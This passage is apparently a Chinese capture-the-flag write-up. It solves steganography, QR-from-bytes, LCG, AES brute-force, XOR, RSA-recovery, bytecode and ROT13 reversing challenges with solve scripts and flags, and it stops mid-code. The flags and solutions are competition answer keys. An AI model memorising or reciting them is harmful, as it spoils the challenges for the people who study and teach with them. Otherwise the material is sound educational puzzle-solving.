steg.pyc -x 得到密码 Extracted payload: TheKey:St3g1sV3ryFuNny。 再将 flag.txt 中emoji密文用emoji-aes解得到flag：cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125; ​ binary 二进制 文件头 CAFEBABE 说明为 .class Java字节码文件，用jadx查看： 12345678package defpackage;/* renamed from: Main reason: default package */public class Main &#123; public static void main(String[] strArr) &#123; byte[] bArr = &#123;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&#125;; &#125;&#125; 10进制转字符串，base64解码得到： 0000000101110000000011111101110000000\\n0111110101101010111110001110110111110\\n0100010100001111000111010110110100010\\n0100010110000011000111000001010100010\\n0100010111011011001101101011110100010\\n0111110101110100000001001000010111110\\n0000000101010101010101010101010000000\\n1111111100100000000100110011111111111\\n1100010101010000101111110100000011000\\n0101101000110010010000100110101011101\\n1011000001001111001100011010000010010\\n1110111111110010101101000110101011100\\n1010110001110000000110100000000000010\\n0110101001000100011011101011101111101\\n0010100100111111101110000110010100010\\n0010001101110110110011001100110011101\\n1110100110001111111011010011000000010\\n0000111010100011100000101101111110111\\n1101100110101101001100010100110000100\\n0101001001111001000001001110010010111\\n0101010011000111000110010000010101000\\n1001101111101110110010011111101011101\\n1101100010111000000101110110001011010\\n0011001000111101100011110100100111101\\n0101000001110101110110101111110100010\\n0101011011001001000000110100010011111\\n0110100010001110010110011011111001100\\n0111001111100000010110110111001111100\\n0100110010110010100010111011000000000\\n1111111101011001110011100101011101011\\n0000000111000111011010110001010100100\\n0111110111001101010110101100011101111\\n0100010100110000110011010000000000010\\n0100010101111101100011111111110100111\\n0100010101101111111100000010101010110\\n0111110111111000101101001111000110110\\n0000000111111011110110000000100011000 37*37的01字符串，转为二维码： 123456789101112s=&#x27;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&#x27;from PIL import Imageimg = Image.new(&#x27;RGB&#x27;,(37,37))width , height = img.sizefor i in range(0,width): for j in range(0,height): if s[37*i+j]==&#x27;0&#x27;: img.putpixel((i,j),(0,0,0)) else: img.putpixel((i,j),(255,255,255))img.save(&#x27;out.png&#x27;) 扫码得flag：flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125; ​ CRYPTOLinearEquations 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import*from secret import flagassert flag[:5] == b&#x27;cazy&#123;&#x27;assert flag[-1:] == b&#x27;&#125;&#x27;flag = flag[5:-1]assert(len(flag) == 24)class my_LCG: def __init__(self, seed1 , seed2): self.state = [seed1,seed2] self.n = getPrime(64) while 1: self.a = bytes_to_long(flag[:8]) self.b = bytes_to_long(flag[8:16]) self.c = bytes_to_long(flag[16:]) if self.a &lt; self.n and self.b &lt; self.n and self.c &lt; self.n: break def next(self): new = (self.a * self.state[-1] + self.b * self.state[-2] + self.c) % self.n self.state.append( new ) return newdef main(): lcg = my_LCG(getRandomInteger(64),getRandomInteger(64)) print(&quot;data = &quot; + str([lcg.next() for _ in range(5)])) print(&quot;n = &quot; + str(lcg.n))if __name__ == &quot;__main__&quot;: main() # data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]# n = 10104483468358610819 魔改三参数LCG，利用满足的公式 $as_{i-1}+bs_{i-2}+c \\equiv s_i \\pmod n$，得到三元一次同余方程组，利用Gröbner基求解： 1234567891011121314151617d = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]n = 10104483468358610819PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))f1 = (a*d[1]+b*d[0]+c-d[2])f2 = (a*d[2]+b*d[1]+c-d[3])f3 = (a*d[3]+b*d[2]+c-d[4])Fs = [f1, f2, f3]I = Ideal(Fs)B = I.groebner_basis()m = b&#x27;&#x27;for b in B: assert b.degree() == 1 mi = ZZ(-b(0, 0, 0)) m += bytes.fromhex(hex(mi)[2:])print(m)# b&#x27;L1near_Equ4t1on6_1s_34sy&#x27; 拼接：cazy&#123;L1near_Equ4t1on6_1s_34sy&#125; ​ no_can_no_bb 123456789101112131415161718192021import randomfrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom secret import flagassert flag[:5] ==b&#x27;cazy&#123;&#x27;def pad(m): tmp = 16-(len(m)%16) return m + bytes([tmp for _ in range(tmp)])def encrypt(m,key): aes = AES.new(key,AES.MODE_ECB) return aes.encrypt(m)if __name__ == &quot;__main__&quot;: flag = pad(flag) key = pad(long_to_bytes(random.randrange(1,1&lt;&lt;20))) c = encrypt(flag,key) print(c)# b&#x27;\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c&#x27; random范围不大，爆破key解AES-ECB： 1234567891011121314151617181920from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESdef pad(x): tmp = 16-(len(x)%16) return x + bytes([tmp for _ in range(tmp)])def decrypt(c,key): aes = AES.new(key,AES.MODE_ECB) return aes.decrypt(c)if __name__ == &quot;__main__&quot;: for i in range(1&lt;&lt;20): key = pad(long_to_bytes(i)) c = b&#x27;\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c&#x27; m = decrypt(c,key) if m.startswith(b&#x27;cazy&#123;&#x27;): print(m) # b&#x27;cazy&#123;n0_c4n,bb?n0p3!&#125;\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b&#x27; ​ no_cry_no_can 1234567891011121314from Crypto.Util.number import*from secret import flag,keyassert len(key) &lt;= 5assert flag[:5] == b&#x27;cazy&#123;&#x27;def can_encrypt(flag,key): block_len = len(flag) // len(key) + 1 new_key = key * block_len return bytes([i^j for i,j in zip(flag,new_key)])c = can_encrypt(flag,key)print(c)# b&#x27;&lt;pH\\x86\\x1a&amp;&quot;m\\xce\\x12\\x00pm\\x97U1uA\\xcf\\x0c:NP\\xcf\\x18~l&#x27; key为5位，已知flag头5位，与密文异或得key = b&#39;\\x5f\\x11\\x32\\xff\\x61&#39;，再异或密文还原明文： cazy&#123;y3_1s_a_h4nds0me_b0y!&#125; ​ no_math_no_cry 123456789101112131415from Crypto.Util.number import*from secret import flagassert len(flag) &lt;= 80def sec_encry(m): cip = (m - (1&lt;&lt;500))**2 + 0x0338470 return cipif __name__ == &quot;__main__&quot;: m = bytes_to_long(flag) c = sec_encry(m) print(c)# 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169 简单逆回去就好，注意一下开方取负值： 1234567c = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169c -= 0x0338470import gmpy2m = -gmpy2.iroot(c,2)[0]print(bytes.fromhex(hex(m+(1&lt;&lt;500))[2:]))# b&#x27;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#x27; ​ math 数学最重要的就是推导 12345pinvq:0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3qinvp:0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7bc:0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386e:0x10005d:0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 给出 $x=\\text{inv}(p,q),y=\\text{inv}(q,p),e,d,c$。 详细推导思路可参考 HITCON 2019 - Lost Modulus Again。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import gmpy2from itertools import productimport binasciifrom Crypto.Util.number import *&quot;&quot;&quot;alpha = p&#x27; * q&#x27; - lbeta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2i.e.:beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;if l,s are correct: alpha = k * t beta = k * (p&#x27; - l) + t * (q&#x27; - l)i.e:&quot;&quot;&quot;def alpha_from_pprime_qprime_l(pprime, qprime, l): return pprime*qprime - ldef beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha): temp1 = e*d - 1 assert temp1 % s == 0 temp2 = ((temp1 // s) - 1) * l * l temp3 = temp2 + l * (pprime + qprime) return temp3 - alpha - (pprime*qprime)def k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta): a = pprime - l b = -beta c = alpha * (qprime - l) disc = b * b - 4 * a * c assert gmpy2.is_square(disc) temp = -b + gmpy2.isqrt(disc) assert temp % (2*a) == 0 k = temp // (2*a) assert alpha % k == 0 return k, alpha // kdef brute_k_t_l(pprime, qprime, e, d): # l, s = 2, 2 ss = [s for s in range(e - 100000, e + 1000000) if s!=0 and (e*d - 1) % s == 0] for l, s in product(range(1, 5000), ss): #print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;) try: alpha = alpha_from_pprime_qprime_l(pprime, qprime, l) beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha) k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta) return k, t, l except AssertionError: continueif __name__ == &quot;__main__&quot;: e = 0x10005 #fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 d = 0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 pprime = 0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3 qprime = 0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b k, t, l = brute_k_t_l(pprime, qprime, e, d) lp, lq = qprime + k, pprime + t assert lp % l == 0, lq % l == 0 p, q = lp // l, lq // l assert gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime assert gmpy2.is_prime(p), gmpy2.is_prime(q) N = p*q c = 0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386 flag_decoded = pow(c, d, N) print(long_to_bytes(flag_decoded)) # b&#x27;flag&#123;c4617a206ba83d7f824dc44e5e67196a&#125;&#x27; ​ REVERSElemon re签到题，格式：flag{output} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781790: const 60 ; &lt;module &#x27;main&#x27;&gt; 5: module 9 59211: const 26 ; 83 16: const 27 ; 69 21: const 28 ; 65 26: array 331: store 0 034: const 30 ; 101 39: const 31 ; 108 44: const 32 ; 111 49: const 33 ; 117 54: const 34 ; 122 59: const 30 ; 101 64: const 35 ; 105 69: const 36 ; 98 74: const 30 ; 101 79: const 31 ; 108 84: const 33 ; 117 89: const 35 ; 105 94: const 37 ; 113 99: const 33 ; 117 104: const 35 ; 105 109: const 37 ; 113 114: array 16119: store 0 1122: const 39 ; 0 127: store 0 2130: array 0135: store 0 3138: load 0 2141: const 42 ; 256 146: lt147: jz 184152: load 0 3155: const 43 ; append 160: getattr161: load 0 2164: call 1166: pop167: load 0 2170: const 44 ; 1 175: add176: store 0 2179: jmp 138184: const 39 ; 0 189: store 0 4192: load 0 4195: const 42 ; 256 200: lt201: jz 271206: load 0 3209: load 0 4212: getitem213: load 0 0216: load 0 4219: const 46 ; 3 224: mod225: getitem226: add227: load 0 1230: load 0 4233: const 47 ; 16 238: mod239: getitem240: add241: const 42 ; 256 246: mod247: load 0 3250: load 0 4253: setitem254: load 0 4257: const 44 ; 1 262: add263: store 0 4266: jmp 192271: const 39 ; 0 276: store 0 5279: load 0 5282: const 46 ; 3 287: lt288: jz 448293: const 39 ; 0 298: store 0 6301: load 0 6304: const 42 ; 256 309: lt310: jz 366315: load 0 3318: load 0 6321: getitem322: load 0 3325: load 0 6328: const 44 ; 1 333: add334: const 42 ; 256 339: mod340: getitem341: bxor342: load 0 3345: load 0 6348: setitem349: load 0 6352: const 44 ; 1 357: add358: store 0 6361: jmp 301366: const 39 ; 0 371: store 0 7374: load 0 7377: const 42 ; 256 382: lt383: jz 431388: load 0 3391: load 0 7394: getitem395: const 44 ; 1 400: add401: const 42 ; 256 406: mod407: load 0 3410: load 0 7413: setitem414: load 0 7417: const 44 ; 1 422: add423: store 0 7426: jmp 374431: load 0 5434: const 44 ; 1 439: add440: store 0 5443: jmp 279448: const 39 ; 0 453: store 0 5456: const 39 ; 0 461: store 0 8464: load 0 5467: const 42 ; 256 472: lt473: jz 509478: load 0 8481: load 0 3484: load 0 5487: getitem488: add489: store 0 8492: load 0 5495: const 44 ; 1 500: add501: store 0 5504: jmp 464509: load 0 8512: const 51 ; 20 517: mul518: const 52 ; 5 523: add524: store 0 8527: load 0 8530: const 54 ; 30 535: mul536: const 52 ; 5 541: sub542: store 0 8545: load 0 8548: const 56 ; 40 553: mul554: const 52 ; 5 559: sub560: store 0 8563: load 0 8566: const 58 ; 50 571: mul572: const 59 ; 6645 577: add578: store 0 8581: const 23 ; &lt;function &#x27;print&#x27;&gt; 586: load 0 8589: call 1591: pop 根据bytecode还原代码，需要注意数组的存储顺序： 123456789101112131415161718192021222324252627key = [83,69,65][::-1]c = [101,108,111,117,122,101,105,98,101,108,117,105,113,117,105,113][::-1]S = []for i in range(256): S.append(i)for j in range(256): S[j] = (S[j]+key[j%3]+c[j%16])%256for k in range(3): for x in range(256): S[x] = S[x]^S[(x+1)%256] for y in range(256): S[y] = (S[y]+1)%256b = 0for k in range(256): b = b+S[k]b = b*20+5b = b*30-5b = b*40-5b = b*50+6645print(b)# 23075096395 flag：flag&#123;23075096395&#125; ​ combat_slogan 面对疫情，我们的口号是什么？flag{input} 用jd工具分析jar，在Main.class发现主代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.xaut;import java.util.Scanner;public class Main &#123; public static String stringTransformAscii(String value) &#123; StringBuffer sbu = new StringBuffer(); char[] chars = value.toCharArray(); for (int i = 0; i &lt; chars.length; i++) &#123; if (i != chars.length - 1) &#123; sbu.append(chars[i]).append(&quot;,&quot;); &#125; else &#123; sbu.append(chars[i]); &#125; &#125; return sbu.toString(); &#125; public static String ttk(String input) &#123; StringBuilder sb = new StringBuilder(); for (int i = 0; i &lt; input.length(); i++) &#123; char c = input.charAt(i); if (c &gt;= &#x27;a&#x27; &amp;&amp; c &lt;= &#x27;m&#x27;) &#123; c = (char)(c + 13); &#125; else if (c &gt;= &#x27;A&#x27; &amp;&amp; c &lt;= &#x27;M&#x27;) &#123; c = (char)(c + 13); &#125; else if (c &gt;= &#x27;n&#x27; &amp;&amp; c &lt;= &#x27;z&#x27;) &#123; c = (char)(c - 13); &#125; else if (c &gt;= &#x27;N&#x27; &amp;&amp; c &lt;= &#x27;Z&#x27;) &#123; c = (char)(c - 13); &#125; sb.append(c); &#125; return sb.toString(); &#125; public static void main(String[] args) &#123; System.out.println(&quot;Please input your keyword); Scanner scan = new Scanner(System.in); String str2 = &quot;ddd&quot;; if (scan.hasNextLine()) str2 = scan.nextLine(); scan.close(); String stringTransformAscii = stringTransformAscii(str2); String[] offerCodeString = stringTransformAscii.split(&quot;,&quot;); StringBuffer str5 = new StringBuffer(); for (String s : offerCodeString) str5.append(s); int flag = ttk(str2).compareTo(&quot;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&quot;); if (flag == 0 